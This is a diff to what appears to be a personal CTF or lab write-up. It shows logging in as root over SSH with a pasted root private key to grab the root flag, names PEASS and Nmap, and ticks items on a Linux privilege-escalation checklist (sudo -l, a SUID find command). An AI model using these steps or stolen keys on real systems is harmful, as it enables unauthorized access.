@@ -76,18 +76,20 @@ sudo -u user2 /bin/bash
 ```bash
 #paste the contents of root private key into local machine
 nvim id_rsa
-
 chmod 600 id_rsa
-
-ssh
+ssh root@$ip -p $port -i id_rsa
 ```
-**Techniques:** [[]]
+- obtain root flag from there
+
+**Techniques:** 
+- [[PEASS]]
+- [[Nmap -sC and -sV (service + script scanning)]]
 
 ## Privilege Escalation
 
 ### Linux checklist
-- [ ] `sudo -l` — sudo rights
-- [ ] SUID/SGID (`find / -perm -4000 -type f 2>/dev/null`)
+- [x] `sudo -l` — sudo rights
+- [x] SUID/SGID (`find / -perm -4000 -type f 2>/dev/null`)
 - [ ] Cron jobs / writable scripts
 - [ ] Kernel version → known exploits
 - [ ] Writable `/etc/passwd`, PATH hijack
